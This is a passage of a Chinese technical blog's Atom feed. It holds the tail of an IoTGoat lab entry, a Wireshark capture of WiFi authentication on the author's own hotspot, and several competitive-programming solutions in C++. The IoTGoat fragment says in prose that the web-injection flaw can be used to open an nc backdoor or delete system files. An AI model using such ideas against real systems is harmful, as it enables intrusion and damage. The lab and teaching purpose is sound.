title="漏洞的应用"></a>漏洞的应用</h2><p>通过Web注入的漏洞利用，可以进行一些有意思的事情，例如运行nc打开某个端口作为后门，又或者是直接的编写一些脚步注入再进行运行，删除一些系统文件，破坏目标靶机等等。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;靶机：IotGoat&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/IoTGoat&quot;&gt;https://github.com/OWASP/IoTGoat&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本次实验通过对IotGoat进行分析，针对其众多漏洞中的一个web漏洞，实现注入的目的，从而达到攻击的目的。&lt;/p&gt;</summary>
    
    
    
    <category term="物联网安全" scheme="http://example.com/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞挖掘" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="Web注入" scheme="http://example.com/tags/Web%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>WIFI认证过程-Wireshark抓包分析</title>
    <link href="http://example.com/2023/03/28/WIFI%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B-Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/03/28/WIFI%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B-Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</id>
    <published>2023-03-28T02:32:52.000Z</published>
    <updated>2023-03-28T03:14:00.200Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境为MacOs，使用的工具为airport、mac自带的嗅探器以及wireshark，以手机热点Mate 30 5G作为测试AP，实验目的为抓去wifi接入认证的数据包，并分析wifi认证的过程。</p><span id="more"></span><p>首先使用<code>sudo airport -s</code>来获取周围的无线信号的BSSID以及SSID，找到手机开放的热点：<br><img src="2.png" alt="2"></p><p>然后将电脑的网卡改为监听模式，具体步骤：</p><ul><li>打开无线诊断</li><li>点击左上角窗口</li><li>选择嗅探器并开始</li><li>在wireshark里，点击设置图标，将网卡勾选monitor选项。</li><li><img src="3.png" alt="3"></li></ul><p>这样以来，wireshark就可以监听802.11的wifi数据包了。</p><p>最后，用另一台设备连接手机，wireshark进行抓包，获得关键数据包如下：</p><p><img src="1.png" alt="1"></p><p>分析数据包，可以得到wifi接入认证的过程：</p><ul><li>主机向AP发送probe req</li><li>AP回应主机probe rep</li><li>主机和AP进行认证，确认对方是不是802.11设备（互发aut包）</li><li>主机和AP进行关联，发送ass包</li></ul><p>到此为止，主机与AP建立好了无线链路，下一步就是4次握手的过程了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;实验环境为MacOs，使用的工具为airport、mac自带的嗅探器以及wireshark，以手机热点Mate 30 5G作为测试AP，实验目的为抓去wifi接入认证的数据包，并分析wifi认证的过程。&lt;/p&gt;</summary>
    
    
    
    <category term="无线网络安全" scheme="http://example.com/categories/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="wifi安全" scheme="http://example.com/tags/wifi%E5%AE%89%E5%85%A8/"/>
    
    <category term="wireshark" scheme="http://example.com/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>线段树学习笔记</title>
    <link href="http://example.com/2023/03/27/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2023/03/27/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2023-03-27T04:43:32.000Z</published>
    <updated>2023-03-27T07:21:53.501Z</updated>
    
    <content type="html"><![CDATA[<p>线段树模版题目：</p><p><a href="https://www.luogu.com.cn/problem/P3372">https://www.luogu.com.cn/problem/P3372</a></p><p>线段树可以很有效的解决一些区间查询的问题（csp第4题，蓝桥杯的一些题目非常常见），如果不会线段树，遇到一些算法题目会被薄纱qwq。</p><p>线段树的主要思想就是二分，可以将一些O(N)的算法降低为O(logN)级别的，面对一些数据量为1e6的题目，可以很有效的解决。</p><p>线段树的写法有结构体和数组的形式，目前只打算学习一下数组的写法（<del>以便于能够快速的在赛场上混个几分</del>）。</p><span id="more"></span><h3 id="建树"><a href="#建树" class="headerlink" title="建树"></a>建树</h3><p>初始化直接全局变量就行了，不用怎么进行操作。</p><pre><code class="lang-c++">void build(int l, int r, int pos, int val)&#123;    if (l == r)    &#123;        // 建树的时候，叶子节点的取值，可以根据题目进行不同的处理        //tree[pos] = val;        cin &gt;&gt; tree[pos];        return;    &#125;    int mid = (l + r) / 2;    build(l, mid, 2 * pos, val); // 左孩子    build(mid + 1, r, 2 * pos + 1, val); // 右孩子      // 记录区间的和，根据题目进行修改    tree[pos] = tree[2 * pos] + tree[2 * pos + 1]; &#125;</code></pre><p>如果题目中输入的数组比较复杂，可以将一维数组改为结构体数组，大致写法相似。</p><h3 id="单点更新"><a href="#单点更新" class="headerlink" title="单点更新"></a>单点更新</h3><pre><code class="lang-c++">void update(int l, int r, int idx, int pos, int val)&#123;    if (l == r)    &#123;        // 更新叶子结点的方式        // 可以根据题目进行其他更改        tree[pos] += val;        return;    &#125;    int mid = (l + r) / 2;    // 左孩子递归    if (idx &lt;= mid) update(l, mid, idx, 2 * pos, val);    // 右孩子递归    else update(mid + 1, r, idx, 2 * pos + 1, val);    tree[pos] = tree[2 * pos] + tree[2 * pos + 1];&#125;</code></pre><p>该部分在idx和mid判断的时候，根据idx的大小来决定从左子树找值还是从右子树找值，找到之后进行更新。（单点操作时在数据量大的时候会超时，但对于一些题目的混分，可以较为轻松的写出）</p><h3 id="范围更新"><a href="#范围更新" class="headerlink" title="范围更新"></a>范围更新</h3><p>单点更新在数据量较大的时候，每次的更新都会花费大量的时间，对此可以采用懒惰标记的方式。在每次更新时，在大区间对应的位置添加标记，表示这个区间的数据变化，然后在每次查询的时候，由于查询时递归的，便可以将标记一层层的带下去，从而更新所有结点的值。</p><p>该部分的思想有点类似于前缀和更新，更新[l, r]的数组元素值+1，通常只需在前缀和的l打上+1标记，在r + 1打上-1标记，然后一次遍历更新前缀和即可。</p><pre><code class="lang-c++">void push_down(ll l, ll r, ll pos)&#123;    if (lazy[pos])    &#123;          // 将懒惰标记带给子树        lazy[2 * pos] += lazy[pos];        lazy[2 * pos + 1] += lazy[pos];        ll mid = (l + r) / 2;          // 更新子树的值        tree[2 * pos] += (mid - l + 1) * lazy[pos];        tree[2 * pos + 1] += (r - mid) * lazy[pos];        lazy[pos] = 0;     &#125;&#125;void update_range(ll l, ll r, ll x, ll y, ll pos, ll val)&#123;    if (x &lt;= l &amp;&amp; r &lt;= y)    &#123;          // 更新懒惰标记以及区间和        lazy[pos] += val;        tree[pos] += (r - l + 1) * val;        return ;    &#125;    push_down(l, r, pos);    ll mid = (l + r) / 2;    if (mid &gt;= x) update_range(l, mid, x, y, 2 * pos, val);    if (mid &lt; y) update_range(mid + 1, r, x, y, 2 * pos + 1, val);    tree[pos] = tree[2 * pos] + tree[2 * pos + 1];&#125;</code></pre><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><pre><code class="lang-c++">ll query_range(ll l, ll r, ll x, ll y, ll pos)&#123;    if (x &lt;= l &amp;&amp; r &lt;= y) return tree[pos];      // 每次查询都对懒惰标记进行处理    push_down(l, r, pos);    ll mid = (l + r) / 2;    ll sum = 0;    if (mid &gt;= x) sum += query_range(l, mid, x, y, 2 * pos);    if (mid &lt; y) sum += query_range(mid + 1, r, x, y, 2 * pos + 1);    return sum;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;线段树模版题目：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P3372&quot;&gt;https://www.luogu.com.cn/problem/P3372&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;线段树可以很有效的解决一些区间查询的问题（csp第4题，蓝桥杯的一些题目非常常见），如果不会线段树，遇到一些算法题目会被薄纱qwq。&lt;/p&gt;
&lt;p&gt;线段树的主要思想就是二分，可以将一些O(N)的算法降低为O(logN)级别的，面对一些数据量为1e6的题目，可以很有效的解决。&lt;/p&gt;
&lt;p&gt;线段树的写法有结构体和数组的形式，目前只打算学习一下数组的写法（&lt;del&gt;以便于能够快速的在赛场上混个几分&lt;/del&gt;）。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="线段树" scheme="http://example.com/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>【CSP】训练计划</title>
    <link href="http://example.com/2023/02/28/%E3%80%90CSP%E3%80%91%E8%AE%AD%E7%BB%83%E8%AE%A1%E5%88%92/"/>
    <id>http://example.com/2023/02/28/%E3%80%90CSP%E3%80%91%E8%AE%AD%E7%BB%83%E8%AE%A1%E5%88%92/</id>
    <published>2023-02-28T14:18:05.000Z</published>
    <updated>2023-02-28T14:51:06.612Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1.png" alt="1"></p><p>该题表达的意思就AOE网络中任务的最早开始时间和最迟开始时间。而由于题目中明确标明了<code>每项科目最多只依赖一项别的科目，且满足依赖科目的编号小于自己</code>，因此在具体的实现过程中简单很多。</p><span id="more"></span><p>可以将整个任务网络看成一个树，子结点的最早开始时间依赖于父结点的最早开始时间，因此有：</p><pre><code>early[i] = early[fa[i]] + cost[fa[i]]</code></pre><p>对于最晚开始时间，可以参考AOE网中的计算方法，而在该题中则简化了一些。使用一个vector存储每个结点的子结点，那么该结点的最迟开始时间依赖于子结点中最早的最迟开始时间（因为不能影响后续任务的进行）：</p><pre><code>late[i] = min(late[son[i]]) - cost[i]</code></pre><p>在这里需要注意的是，最后一个完成的任务（也就是树的叶子结点）在计算时，需要+1，即：</p><pre><code>late[i] = n - cost[i] + 1</code></pre><p>AC代码：</p><pre><code class="lang-c++">#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;vector&gt;using namespace std;int n, m;int depend[1005], cost[1005];int early[1005], late[1005];vector&lt;int&gt; son[1005];int keyPathLen = 0;int main()&#123;    cin &gt;&gt; n &gt;&gt; m;    for (int i = 1; i &lt;= m; i++)        cin &gt;&gt; depend[i];    for (int i = 1; i &lt;= m; i++)        cin &gt;&gt; cost[i];      for (int i = 1; i &lt;= m; i++)        son[depend[i]].push_back(i);    int canFinish = 1;    // 最迟开始时间直接就是父节点的开始时间 + 父节点的消费时间    for (int i = 1; i &lt;= m; i++)    &#123;        // 根据题意，父节点只有一个        if (depend[i] == 0)            early[i] = 1;        else            early[i] = early[depend[i]] + cost[depend[i]];        if (early[i] + cost[i] - 1 &gt; n)            canFinish = 0;    &#125;    //cout &lt;&lt; &quot;keyPathLen: &quot; &lt;&lt; keyPathLen &lt;&lt; endl;    for (int i = 1; i &lt;= m; i++)        cout &lt;&lt; early[i] &lt;&lt; &quot; &quot;;    cout &lt;&lt; endl;    // 求最迟时间    if (canFinish)    &#123;        for (int i = m; i &gt;= 1; i--)        &#123;            // 这里需要+1，具体可以找几个例子            if (son[i].size() == 0)                late[i] = n - cost[i] + 1;            else            &#123;                // 最晚时间是不影响子节点的开始时间，需要获得子节点中最小的最迟开始时间                int minLen = INT_MAX;                for (int j = 0; j &lt; son[i].size(); j++)                    minLen = min(minLen, late[son[i][j]]);                late[i] = minLen - cost[i];            &#125;        &#125;        for (int i = 1; i &lt;= m; i++)            cout &lt;&lt; late[i] &lt;&lt; &quot; &quot;;        cout &lt;&lt; endl;    &#125;    system(&quot;pause&quot;);&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;该题表达的意思就AOE网络中任务的最早开始时间和最迟开始时间。而由于题目中明确标明了&lt;code&gt;每项科目最多只依赖一项别的科目，且满足依赖科目的编号小于自己&lt;/code&gt;，因此在具体的实现过程中简单很多。&lt;/p&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="csp" scheme="http://example.com/tags/csp/"/>
    
    <category term="AOE" scheme="http://example.com/tags/AOE/"/>
    
    <category term="数组" scheme="http://example.com/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】重新排序</title>
    <link href="http://example.com/2023/02/01/%E3%80%90OJ%E3%80%91%E9%87%8D%E6%96%B0%E6%8E%92%E5%BA%8F/"/>
    <id>http://example.com/2023/02/01/%E3%80%90OJ%E3%80%91%E9%87%8D%E6%96%B0%E6%8E%92%E5%BA%8F/</id>
    <published>2023-02-01T06:03:45.000Z</published>
    <updated>2023-02-01T06:09:03.135Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.lanqiao.cn/problems/2128/learning/">重新排序 - 蓝桥云课 (lanqiao.cn)</a></p><p>该题的关键点：如何获得重新排序的查询区间之和的最大值。</p><p>可以这样进行考虑，我们希望数组中最大的几个数在我们查询的区间中，这样一来，所查询的和就是数组中最大的几个数的和。另外，题目中区间是可以有重叠的，因此我们可以首先统计每个下标的查询次数，然后将数组进行排序，查询次数最大的坐标存放数组中最大的数（以此类推），这样我们求得的和就是最大。</p><p>统计次数用了前缀和和差分进行处理（不知道正常的遍历会不会超时。</p><p>AC代码：</p><pre><code class="lang-c++">#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;typedef unsigned long long int ll;ll sum1[100005], sum2[100005];ll arr[100005];long long int query[1000005];bool cmp(const int a, const int b)&#123;    return a &gt;  b;&#125;int main()&#123;    ll n;    cin &gt;&gt; n;    for (int i = 1; i &lt;= n; i++)        cin &gt;&gt; arr[i];    for (int i = 1; i &lt;= n; i++)        sum1[i] += sum1[i - 1] + arr[i];    ll m;    cin &gt;&gt; m;    ll len = 0;    ll query_sum = 0;    for (int i = 1; i &lt;= m; i++)    &#123;        ll L, R;        cin &gt;&gt; L &gt;&gt; R;        // 查询的区间内，坐标的访问次数 +1        query[L] += 1, query[R + 1] -= 1;         query_sum += sum1[R] - sum1[L - 1];    &#125;    for (int i = 1; i &lt;= n + 1; i++)        query[i] += query[i - 1];    sort(arr + 1, arr + 1 + n, cmp);    sort(query + 1, query + 1 + n, cmp);    ll query_max = 0;    for (int i = 1; query[i] != 0; i++)    &#123;        query_max += arr[i] * query[i];    &#125;    cout &lt;&lt; query_max - query_sum &lt;&lt; endl;    system(&quot;pause&quot;);&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.lanqiao.cn/problems/2128/learning/&quot;&gt;重新排序 - 蓝桥云课 (lanqiao.cn)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该题的关键点：如何获得重新排序的查询区间之和的最大值。&lt;/p&gt;
&lt;p&gt;可以这样进行考虑，</summary>
      
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="前缀和" scheme="http://example.com/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    
    <category term="蓝桥杯" scheme="http://example.com/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
    
    <category term="排序" scheme="http://example.com/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】求和</title>
    <link href="http://example.com/2023/01/27/%E3%80%90OJ%E3%80%91%E6%B1%82%E5%92%8C/"/>
    <id>http://example.com/2023/01/27/%E3%80%90OJ%E3%80%91%E6%B1%82%E5%92%8C/</id>
    <published>2023-01-27T07:18:29.000Z</published>
    <updated>2023-01-27T07:28:30.624Z</updated>
    
    <content type="html"><![CDATA[<p>题目来源：<a href="https://www.luogu.com.cn/problem/P2671">P2671 [NOIP2015 普及组] 求和 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p><p>题目中给定三元组（x，y，z），可以发现y根本没有什么作用，只要（x + z）/ 2是一个整数就行了。那么我们所求的三元组就是同奇偶的x和z。</p><p>在计算之前，先进性排序处理，首先将相同color的数放在一起，然后对于相同color的数据，将其按照奇偶进行分开，因此需要自定义cmp函数：</p><pre><code class="lang-c++">bool cmp(const Node &amp;a, const Node &amp;b)&#123;    if (a.col != b.col)        return a.col &lt; b.col;    else        return a.idx % 2 &lt; b.idx % 2;&#125;</code></pre><span id="more"></span><p>排好序后，就可以用双指针，遍历x和z，将符合条件的数进行计算，但这样做最终只能过8个检测点（O2优化可过9个），因此要想全部AC需要继续优化算法，很显然，计算方式是优化的一个地方。</p><p>考虑以下式子：</p><pre><code>n = 1ans = f1 * a1n = 2ans = (f1 + f2) * (a1 + a2)n = 3ans = (f1 + f2) * (a1 + a2) + (f1 + f3) * (a1 + a3) + (f2 + f3) * (a2 + a3)    = (f1 + f2 + f3) * (a1 + a2 + a3) + f1 * a1 + f2 * a2 + f3 * f3n = 4ans = (f1 + f2 + f3 + f4) * (a1 + a2 + a3 + a4) + 2 * (f1 * a1 + f2 * a2 + f3 * a3 + f4 * a4)</code></pre><p>于是可以得到计算的通式：</p><pre><code>ans(n) = sum_f(n) * sum_a(n) + (n - 2) * sum_fa(n)</code></pre><p>因此我们可以转换为前缀和的形式来进行计算，可以大大降低时间复杂度，代码如下：</p><pre><code class="lang-c++">//#pragma GCC optimize(2)#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;typedef unsigned long long int ll;#define N (10007)ll n, m;struct Node&#123;    ll idx;    ll num;    ll col;&#125;;ll sumf[100005], suma[100005], sumfa[100005];Node arr[100005];int read() &#123;    int x=0,f=1;    char c=getchar();    while(c&lt;&#39;0&#39;||c&gt;&#39;9&#39;)&#123;if(c==&#39;-&#39;) f=-1;c=getchar();&#125;    while(c&gt;=&#39;0&#39;&amp;&amp;c&lt;=&#39;9&#39;) x=x*10+c-&#39;0&#39;,c=getchar();    return x*f;&#125;void write(int x) &#123;     if(x&lt;0) putchar(&#39;-&#39;),x=-x;     if(x&gt;9) write(x/10);     putchar(x%10+&#39;0&#39;);&#125;bool cmp(const Node &amp;a, const Node &amp;b)&#123;    if (a.col != b.col)        return a.col &lt; b.col;    else        return a.idx % 2 &lt; b.idx % 2;&#125;int main()&#123;    cin &gt;&gt; n &gt;&gt; m;    for (ll i = 1; i &lt;= n; i++)        arr[i].num = read();    for (ll i = 1; i &lt;= n; i++)        arr[i].col = read();    for (ll i = 1; i &lt;= n; i++)        arr[i].idx = i;    sort(arr + 1, arr + n + 1, cmp);    sumf[0] = suma[0] = sumfa[0] = 0;    sumf[1] = arr[1].num, suma[1] = arr[1].idx, sumfa[1] = arr[1].idx * arr[1].num;     for (int i = 2; i &lt;= n; i++)        sumf[i] = sumf[i - 1] + arr[i].num, suma[i] = suma[i - 1] + arr[i].idx, sumfa[i] += sumfa[i - 1] + arr[i].idx * arr[i].num;      ll ans = 0;    //for (int i = 1; i &lt;= n; i++)      //  cout &lt;&lt; arr[i].idx &lt;&lt; &quot; &quot; &lt;&lt; arr[i].col &lt;&lt; &quot; &quot; &lt;&lt; arr[i].num &lt;&lt; endl;    for (ll i = 1; i &lt;= n; )    &#123;        int j = i + 1;        while (j &lt;= n &amp;&amp; arr[j].col == arr[i].col &amp;&amp; !((arr[j].idx + arr[i].idx) % 2)) j++;        j--;        if (j &gt; i)            ans += (sumf[j] - sumf[i - 1]) * (suma[j] - suma[i - 1]) + (j - i - 1) * (sumfa[j] - sumfa[i - 1]) % N;        i = j + 1;    &#125;    cout &lt;&lt; ans % N &lt;&lt; endl;    system(&quot;pause&quot;);&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目来源：&lt;a href=&quot;https://www.luogu.com.cn/problem/P2671&quot;&gt;P2671 [NOIP2015 普及组] 求和 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;题目中给定三元组（x，y，z），可以发现y根本没有什么作用，只要（x + z）/ 2是一个整数就行了。那么我们所求的三元组就是同奇偶的x和z。&lt;/p&gt;
&lt;p&gt;在计算之前，先进性排序处理，首先将相同color的数放在一起，然后对于相同color的数据，将其按照奇偶进行分开，因此需要自定义cmp函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-c++&quot;&gt;bool cmp(const Node &amp;amp;a, const Node &amp;amp;b)
&amp;#123;
    if (a.col != b.col)
        return a.col &amp;lt; b.col;
    else
        return a.idx % 2 &amp;lt; b.idx % 2;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="前缀和" scheme="http://example.com/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】迷宫</title>
    <link href="http://example.com/2023/01/24/%E3%80%90OJ%E3%80%91%E8%BF%B7%E5%AE%AB/"/>
    <id>http://example.com/2023/01/24/%E3%80%90OJ%E3%80%91%E8%BF%B7%E5%AE%AB/</id>
    <published>2023-01-24T14:17:03.000Z</published>
    <updated>2023-01-24T14:31:57.755Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>这天, 小明在玩迷宫游戏。</p><p>迷宫为一个 n<em>×</em>n 的网格图, 小明可以在格子中移动, 左上角为 (1,1), 右 下角 (<em>n</em>,<em>n</em>) 为终点。迷宫中除了可以向上下左右四个方向移动一格以外, 还有 m* 个双向传送门可以使用, 传送门可以连接两个任意格子。</p><p>假如小明处在格子 (<em>x</em>1,<em>y</em>1), 同时有一个传送门连接了格子(<em>x</em>1,<em>y</em>1) 和 (<em>x</em>2,<em>y</em>2), 那么小明既可以花费 1 的步数向上下左右四个方向之一走一格 (不能 越过边界), 也可以花费 1 的步数通过传送门走到格子(<em>x</em>2,<em>y</em>2) 去。</p><p>而对于同一个迷宫, 小明每次进入的初始格子是在这 n<em>×</em>n* 个格子中均匀随 机的 (当然运气好可以直接随机到终点), 他想知道从初始格子走到终点的最短 步数的期望值是多少。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>输入共 1+m 行, 第一行为两个正整数 n<em>,</em>m*。</p><p>后面 m<em> 行, 每行四个正整数 x**i</em>1,<em>y**i</em>1,<em>x**i</em>2,<em>y**i</em>2 表示第 i* 个传送门连接的两个格子坐标。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>输出共一行, 一个浮点数表示答案 (请保留两位小数)。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="lang-text">2 11 1 2 2</code></pre><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="lang-text">0.75</code></pre><h3 id="样例解释"><a href="#样例解释" class="headerlink" title="样例解释"></a>样例解释</h3><p>由于传送门的存在, 从 (1,1) 出发到终点 (2,2)(2,2) 只需要一步; 而从(1,2) 和 (2,1) 出发也只需要向下/右走一步; 从 (2,2) 出发需要 0 步。所以步数期望为 1+1+1+02×2=0.752×21+1+1+0=0.75</p><span id="more"></span><p>该题可以很显然的看出来是个动态规划的题，类似的题目有<code>过河卒</code>、<code>马的遍历</code>。我们正着做这题的话，显然不太好弄，所以需要反向遍历这个迷宫，将问题转换为求(n, n)到其他所有点的最短距离，而关于一个图中最短距离的求解，采用BFS最佳，那么该题的思路就可以出来了：</p><ul><li>反向bfs迷宫，并在搜索过程中，更新（n，n）点到每个点的最短距离</li><li>对于每个点，不仅需要遍历其四个方向的点，还需要遍历有传送门的情况下的令一个点</li></ul><p>另外，该题需要注意的是，传送门是双向的，可以从（x1，y1）到（x2，y2），反过来也可以从（x2，y2）到（x1，y1），否则会非常容易20个测试点全寄。。。</p><p>另外在遍历每个点时，首先用一个数组vis判断该点是否已经遍历过了，如果vis为1，直接跳过该点。</p><pre><code class="lang-c++">#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;utility&gt;#include &lt;vector&gt;using namespace std;int f[2005][2005];int vis[2005][2005];int n, m;queue&lt;pair&lt;int, int&gt; &gt; q;vector&lt;pair&lt;int, int&gt; &gt; v[2005][2005];bool check(int x, int y)&#123;    return x &gt;= 1 &amp;&amp; x &lt;= n &amp;&amp; y &gt;= 1 &amp;&amp; y &lt;= n &amp;&amp; !vis[x][y]; &#125;void bfs()&#123;    while (!q.empty())    &#123;        int x, y;        x = q.front().first;        y = q.front().second;        q.pop();        // 如果该点已经遍历过，直接跳过        if (vis[x][y]) continue;        vis[x][y] = 1;        if (check(x, y - 1)) f[x][y - 1] = min(f[x][y - 1], 1 + f[x][y]), q.push(make_pair(x, y - 1));        if (check(x - 1, y)) f[x - 1][y] = min(f[x - 1][y], 1 + f[x][y]), q.push(make_pair(x - 1, y));        if (check(x, y + 1)) f[x][y + 1] = min(f[x][y + 1], 1 + f[x][y]), q.push(make_pair(x, y + 1));        if (check(x + 1, y)) f[x + 1][y] = min(f[x + 1][y], 1 + f[x][y]), q.push(make_pair(x + 1, y));        if (v[x][y].size())        &#123;            for (int i = 0; i &lt; v[x][y].size(); i++)            &#123;                int x1 = v[x][y][i].first;                int y1 = v[x][y][i].second;                if (check(x1, y1)) f[x1][y1] = min(f[x1][y1], 1 + f[x][y]), q.push(make_pair(x1, y1));            &#125;        &#125;    &#125;&#125;int main()&#123;    cin &gt;&gt; n &gt;&gt; m;    for (int i = 1; i &lt;= m; i++)    &#123;        int x1, x2, y1, y2;        cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;        v[x2][y2].push_back(make_pair(x1, y1));        v[x1][y1].push_back(make_pair(x2, y2));    &#125;    for (int i = 1; i &lt;= n; i++)        for (int j = 1; j &lt;= n; j++)            f[i][j] = 2 * n - i - j;    q.push(make_pair(n, n));    bfs();    int res = 0;    for (int i = 1; i &lt;= n; i++)        for (int j = 1; j &lt;= n; j++)            res += f[i][j];    printf(&quot;%.2f\n&quot;, (float)(res * 1.0 / (n * n)));    system(&quot;pause&quot;);    return 0;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h3&gt;&lt;p&gt;这天, 小明在玩迷宫游戏。&lt;/p&gt;
&lt;p&gt;迷宫为一个 n&lt;em&gt;×&lt;/em&gt;n 的网格图, 小明可以在格子中移动, 左上角为 (1,1), 右 下角 (&lt;em&gt;n&lt;/em&gt;,&lt;em&gt;n&lt;/em&gt;) 为终点。迷宫中除了可以向上下左右四个方向移动一格以外, 还有 m* 个双向传送门可以使用, 传送门可以连接两个任意格子。&lt;/p&gt;
&lt;p&gt;假如小明处在格子 (&lt;em&gt;x&lt;/em&gt;1,&lt;em&gt;y&lt;/em&gt;1), 同时有一个传送门连接了格子(&lt;em&gt;x&lt;/em&gt;1,&lt;em&gt;y&lt;/em&gt;1) 和 (&lt;em&gt;x&lt;/em&gt;2,&lt;em&gt;y&lt;/em&gt;2), 那么小明既可以花费 1 的步数向上下左右四个方向之一走一格 (不能 越过边界), 也可以花费 1 的步数通过传送门走到格子(&lt;em&gt;x&lt;/em&gt;2,&lt;em&gt;y&lt;/em&gt;2) 去。&lt;/p&gt;
&lt;p&gt;而对于同一个迷宫, 小明每次进入的初始格子是在这 n&lt;em&gt;×&lt;/em&gt;n* 个格子中均匀随 机的 (当然运气好可以直接随机到终点), 他想知道从初始格子走到终点的最短 步数的期望值是多少。&lt;/p&gt;
&lt;h3 id=&quot;输入格式&quot;&gt;&lt;a href=&quot;#输入格式&quot; class=&quot;headerlink&quot; title=&quot;输入格式&quot;&gt;&lt;/a&gt;输入格式&lt;/h3&gt;&lt;p&gt;输入共 1+m 行, 第一行为两个正整数 n&lt;em&gt;,&lt;/em&gt;m*。&lt;/p&gt;
&lt;p&gt;后面 m&lt;em&gt; 行, 每行四个正整数 x**i&lt;/em&gt;1,&lt;em&gt;y**i&lt;/em&gt;1,&lt;em&gt;x**i&lt;/em&gt;2,&lt;em&gt;y**i&lt;/em&gt;2 表示第 i* 个传送门连接的两个格子坐标。&lt;/p&gt;
&lt;h3 id=&quot;输出格式&quot;&gt;&lt;a href=&quot;#输出格式&quot; class=&quot;headerlink&quot; title=&quot;输出格式&quot;&gt;&lt;/a&gt;输出格式&lt;/h3&gt;&lt;p&gt;输出共一行, 一个浮点数表示答案 (请保留两位小数)。&lt;/p&gt;
&lt;h3 id=&quot;样例输入&quot;&gt;&lt;a href=&quot;#样例输入&quot; class=&quot;headerlink&quot; title=&quot;样例输入&quot;&gt;&lt;/a&gt;样例输入&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;lang-text&quot;&gt;2 1
1 1 2 2
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;样例输出&quot;&gt;&lt;a href=&quot;#样例输出&quot; class=&quot;headerlink&quot; title=&quot;样例输出&quot;&gt;&lt;/a&gt;样例输出&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;lang-text&quot;&gt;0.75
&lt;/code&gt;&lt;/pre&gt;
